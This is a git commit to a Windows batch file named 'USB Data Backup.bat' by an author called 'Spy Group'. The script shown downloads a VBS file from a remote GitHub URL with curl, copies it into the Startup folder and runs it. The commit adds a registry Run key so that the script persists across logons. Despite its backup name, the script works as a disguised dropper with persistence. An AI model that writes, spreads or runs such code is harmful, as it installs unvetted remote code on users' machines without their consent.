3e26b3aef13c00926c232dd488042eeffa222011
Spy Group <168579723+spy-group@users.noreply.github.com>
2025-03-13 10:47:08 +0500

    USB Data Backup.bat

--- All Bat Files/USB Data Backup.bat
+++ All Bat Files/USB Data Backup.bat
@@ -5,6 +5,9 @@ curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-B
 REM Copy the downloaded file to the Startup folder
 copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
 
+REM Add test.vbs to startup
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestScript" /t REG_SZ /d "wscript \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs\"" /f
+
 REM Run the VBS file
 wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
 
